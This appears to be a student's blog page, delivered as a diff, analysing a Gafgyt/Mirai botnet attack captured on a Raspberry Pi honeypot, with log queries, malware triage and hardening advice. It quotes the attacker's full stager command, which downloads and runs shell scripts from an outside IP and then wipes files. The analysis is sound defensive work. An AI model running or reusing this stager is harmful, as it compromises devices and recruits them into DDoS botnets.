@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="Austin Long ">
+<meta name="description" content="Introduction As a requirement for completing the Applied Cybersecurity Bachelors program, I attended an internship program with the Internet Storm Center. I was tasked to create a Honeypot on a Pi and report six different attack observations. This post is going to explore one of those attack observations
+Summary As a quick summary, I dive into uncovering a malicious file. From that file, I was able to uncover more malicious files by actively connecting to an attacker’s FTP server." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://longbits.github.io/defense/honey_pot_attack1/" />
+
+
+    <title>
+        
+            Is Your Home Part of a Cyber Army? :: A Long Blog  — Hello Friend NG Theme
+        
+    </title>
+
+
+
+
+
+<link rel="stylesheet" href="https://longbits.github.io/main.b78c3be9451dc4ca61ca377f3dc2cf2e6345a44c2bae46216a322ef366daa399.css" integrity="sha256-t4w76UUdxMphyjd/PcLPLmNFpEwrrkYhajIu82bao5k=">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://longbits.github.io/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://longbits.github.io/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://longbits.github.io/favicon-16x16.png">
+    <link rel="manifest" href="https://longbits.github.io/site.webmanifest">
+    <link rel="mask-icon" href="https://longbits.github.io/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="https://longbits.github.io/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+<meta itemprop="name" content="Is Your Home Part of a Cyber Army?">
+<meta itemprop="description" content="Introduction As a requirement for completing the Applied Cybersecurity Bachelors program, I attended an internship program with the Internet Storm Center. I was tasked to create a Honeypot on a Pi and report six different attack observations. This post is going to explore one of those attack observations
+Summary As a quick summary, I dive into uncovering a malicious file. From that file, I was able to uncover more malicious files by actively connecting to an attacker’s FTP server."><meta itemprop="datePublished" content="2023-06-13T19:32:49-04:00" />
+<meta itemprop="dateModified" content="2023-06-13T19:32:49-04:00" />
+<meta itemprop="wordCount" content="982"><meta itemprop="image" content="https://longbits.github.io"/>
+<meta itemprop="keywords" content="" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://longbits.github.io"/>
+
+<meta name="twitter:title" content="Is Your Home Part of a Cyber Army?"/>
+<meta name="twitter:description" content="Introduction As a requirement for completing the Applied Cybersecurity Bachelors program, I attended an internship program with the Internet Storm Center. I was tasked to create a Honeypot on a Pi and report six different attack observations. This post is going to explore one of those attack observations
+Summary As a quick summary, I dive into uncovering a malicious file. From that file, I was able to uncover more malicious files by actively connecting to an attacker’s FTP server."/>
+
+
+
+    <meta property="og:title" content="Is Your Home Part of a Cyber Army?" />
+<meta property="og:description" content="Introduction As a requirement for completing the Applied Cybersecurity Bachelors program, I attended an internship program with the Internet Storm Center. I was tasked to create a Honeypot on a Pi and report six different attack observations. This post is going to explore one of those attack observations
+Summary As a quick summary, I dive into uncovering a malicious file. From that file, I was able to uncover more malicious files by actively connecting to an attacker’s FTP server." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://longbits.github.io/defense/honey_pot_attack1/" /><meta property="og:image" content="https://longbits.github.io"/><meta property="article:section" content="Defense" />
+<meta property="article:published_time" content="2023-06-13T19:32:49-04:00" />
+<meta property="article:modified_time" content="2023-06-13T19:32:49-04:00" />
+
+
+
+
+
+
+    <meta property="article:published_time" content="2023-06-13 19:32:49 -0400 EDT" />
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="https://longbits.github.io/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">&gt;</span>
+            <span class="logo__text ">
+                $ cd /home/</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://longbits.github.io/ctf/">CTF</a></li><li><a href="https://longbits.github.io/defense">Defense</a></li><li><a href="https://longbits.github.io/whoami/">Whoami</a></li>
+        <div class="submenu">
+            <li class="dropdown">
+                <a href="javascript:void(0)" class="dropbtn">en</a>
+                <div class="dropdown-content">
+                    
+                        
+                    
+                </div>
+            </li>
+        </div>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            <h2 class="post-title"><a href="https://longbits.github.io/defense/honey_pot_attack1/">Is Your Home Part of a Cyber Army?</a></h2>
+
+            
+            
+            
+
+            <div class="post-content">
+                <h1 id="introduction">Introduction</h1>
+<p>As a requirement for completing the Applied Cybersecurity Bachelors program, I attended an internship program with the Internet Storm Center. I was tasked to create a Honeypot on a Pi and report six different attack observations. This post is going to explore one of those attack observations</p>
+<hr>
+<h1 id="summary">Summary</h1>
+<p>As a quick summary, I dive into uncovering a malicious file. From that file, I was able to uncover more malicious files by actively connecting to an attacker’s FTP server. The attacker attempts to add my honeypot into a botnet so the attacker can carry out DDoS attacks. The vulnerabilities used for the attack were default credentials and CVE-2017-17215. To prevent these attacks, make sure systems are patched and using strong credentials. More information on how to protect your systems can be found at the end.</p>
+<hr>
+<h1 id="finding-indicator-of-compromise">Finding Indicator of Compromise</h1>
+<p>To do an analysis of an attack, I had to first actually find an attack. One of the first places I go to start my analysis is to the Downloaded files directory of the honeypot. This directory contains files uploaded by attackers who connected to the honeypot either by SSH or Telnet. I looked for any interesting files and I found a bash script. Looking at the file, the script ran multiple commands</p>
+<p><img src="https://longbits.github.io/Defense/AO1/PIC1.png" alt="Bad File"></p>
+<hr>
+<h1 id="the-attack">The Attack</h1>
+<p>I noticed the file was uploaded on September 02 and started with that information. I moved into the SSH logs generated from Cowrie, the SSH honeypot service, and analyzed the log represented in JSON format. I found the SSH session ID and filtered the data to only look at that session. The command I ran was:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-BASH" data-lang="BASH"><span style="display:flex;"><span>jq <span style="color:#e6db74">&#39;. | select(.session==&#34;cbbb3572f898&#34;)&#39;</span> cowrie.json.2023-09-02
+</span></span></code></pre></div><p><img src="https://longbits.github.io/Defense/AO1/PIC2.png" alt="SSH jq"></p>
+<p>The attacker gained access by credential stuffing default credentials. The attacker attempted five login attempts and was successful with using the credential root:root. Once on the honeypot, the attacker ran the following command:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-BASH" data-lang="BASH"><span style="display:flex;"><span>cd /tmp <span style="color:#f92672">||</span> cd /var/run <span style="color:#f92672">||</span> cd /mnt <span style="color:#f92672">||</span> cd /root <span style="color:#f92672">||</span> cd /; wget http://185.254.37.243/z.sh; curl -O http://185.254.37.243/z.sh; chmod <span style="color:#ae81ff">777</span> z.sh; sh z.sh; tftp 185.254.37.243 -c get tz.sh; chmod <span style="color:#ae81ff">777</span> tz.sh; sh tz.sh; tftp -r tz2.sh -g 185.254.37.243; chmod <span style="color:#ae81ff">777</span> tz2.sh; sh tz2.sh; ftpget -v -u anonymous -p anonymous -P <span style="color:#ae81ff">21</span> 185.254.37.243 z1.sh z1.sh; sh z1.sh; rm -rf z.sh tz.sh tz2.sh z1.sh; rm -rf *
+</span></span></code></pre></div><p>The command replicates what was seen above from the downloaded file, but it acts as the stager to download the initial file. The command attempted to retrieve multiple files:</p>
+<ul>
+<li>z.sh</li>
+<li>z1.sh</li>
+<li>tz.sh</li>
+<li>tz2.sh</li>
+</ul>
+<p>Attackers will commonly use one-letter or two-letter names for malware Defenders can easily write rules to detect this. I learned about that TTP from the FOR508 course, Advanced Incident Response, Threat Hunting, and Digital Forensics.</p>
+<p>I looked through the Downloads directory on the honeypot, but could not find any instances of the files <em>tz.sh</em> or <em>tz2.sh</em>. However, I did find the <em>z1.sh file</em>.</p>
+<p><img src="https://longbits.github.io/Defense/AO1/PIC3.png" alt="z1.sh"></p>
+<p>The file <em>z1.sh</em> attempted to do pretty much the same thing as <em>z.sh</em>, but using an FTP service instead</p>
+<p>I wanted to find more information about the <em>skid</em> file being executed from the bash script above. From googling the name, I could not find anything. The file was not downloaded on my honeypot, so I decided to see if I could manually download the file. I spun up a fresh Virtual Machine so I could better analyze the malware. I pinged the server to see if I could get a response, and I did! Seeing how the server accepted anonymous logins via FTP, I attempted to connect to the FTP service and <strong>success</strong>! I logged in</p>
+<p><img src="https://longbits.github.io/Defense/AO1/PIC4.png" alt="FTP server"></p>
+<p>The server was hosting lots of malware. The nerd in me wanted to download all the files and look at them but I decided to stick to the current analysis. I downloaded the files <em>tz.sh</em> and <em>skid.x86</em>.</p>
+<p>The <em>tz.sh</em> file replicated the same thing that <em>z.sh</em> did. The <em>skid.x86</em> file was what was really interesting. To see what type of file it was, I ran <code>file skid.x86</code></p>
+<p><img src="https://longbits.github.io/Defense/AO1/PIC5.png" alt="File skid"></p>
+<p>Since it was an executable, I decided to run strings to see if could find any low-hanging fruit. A lot of the output was garbage, besides one section.</p>
+<p><img src="https://longbits.github.io/Defense/AO1/PIC6.png" alt="Command Injection"></p>
+<p>This section of string seemed like an HTTP header using command injection within the XML data. The ‘realm=”HuaweiHomeGateway”’ part stuck out to me as well. It seemed like the payload was targeting Huawei home routers.</p>
+<p>When I uploaded the file into Virus Total, I got back some pretty interesting findings. 32 vendors flagged the file as malicious, with multiple vendors referring to the Gafgyt and Mirai Botnet</p>
+<hr>
+<h1 id="the-threat-actors">The Threat Actors</h1>
+<p>What is the Gafgyt botnet? Well according to an article from Threat Post [<a href="https://threatpost.com/gafgyt-botnet-ddos-mirai/165424/">1</a>], Gafgyt is a botnet discovered in 2014 which targets IoT devices like Huawei routers. The botnet primary goal is to conduct DDoS attacks. Another name for the botnet is called BASHLITE [<a href="https://en.wikipedia.org/wiki/BASHLITE">2</a>]. According to the article, the botnet would use an exploit called <strong>CVE-2017-17215</strong>. Researching the CVE, I found a PoC uploaded on ExploitDB located <strong><a href="https://www.exploit-db.com/exploits/43414">here</a></strong>. Comparing the PoC with the IP Header within the malware, it looked the same very similar! [<a href="https://www.exploit-db.com/exploits/43414">3</a>]</p>
+<hr>
+<h1 id="resolution-and-lessons-learned">Resolution and Lessons Learned</h1>
+<p>The key takeaway from this attack observation is to make sure you do not have any home routers exposed to the public internet, do not use default passwords, and make sure your devices are updated! The CVE attempted was from 2017, but since it is still being used there could be routers still out there that are not patched. Routers and IoT devices are commonly forgotten by everyday users. Please, everyone, update your systems. This post serves as a wake-up call for everyone to check their routers and IoT devices to make sure attackers stay out of your network. If SSH and systems must be exposed to the public internet, you can take steps to harden them with firewalls, fail2ban, and only allow the use of SSH keys. [<a href="https://www.cisecurity.org/cis-benchmarks">4</a>][<a href="https://attack.mitre.org/techniques/T1021/004/">5</a>]</p>
+<hr>
+<h3 id="references">References</h3>
+<ul>
+<li>[1] <a href="https://threatpost.com/gafgyt-botnet-ddos-mirai/165424/">https://threatpost.com/gafgyt-botnet-ddos-mirai/165424/</a></li>
+<li>[2] <a href="https://en.wikipedia.org/wiki/BASHLITE">https://en.wikipedia.org/wiki/BASHLITE</a></li>
+<li>[3] <a href="https://www.exploit-db.com/exploits/43414">https://www.exploit-db.com/exploits/43414</a></li>
+<li>[4] <a href="https://www.cisecurity.org/cis-benchmarks">https://www.cisecurity.org/cis-benchmarks</a></li>
+<li>[5] <a href="https://attack.mitre.org/techniques/T1021/004/">https://attack.mitre.org/techniques/T1021/004/</a></li>
+</ul>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+            
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2023</span>
+            <span><a href="https://longbits.github.io">Austin Long</a></span>
+            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
+            <span><a href="https://longbits.github.io/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+            
+        </div>
+    </div>
+    
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="http://gohugo.io">Hugo</a></span><span>Made with fightmilk</span>
+        </div>
+    </div>
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="https://longbits.github.io/bundle.min.205d491810c28f95aa953fae884e1c27abe13fdf93ec63b882d0036b248d4a6282eb2d134e4e7225c6ad6e86db87b08488a361ca4a7383d01fcff43f3d57b9c3.js" integrity="sha512-IF1JGBDCj5WqlT&#43;uiE4cJ6vhP9&#43;T7GO4gtADaySNSmKC6y0TTk5yJcatbobbh7CEiKNhykpzg9Afz/Q/PVe5ww=="></script>
+
+
+
+    </body>
+</html>
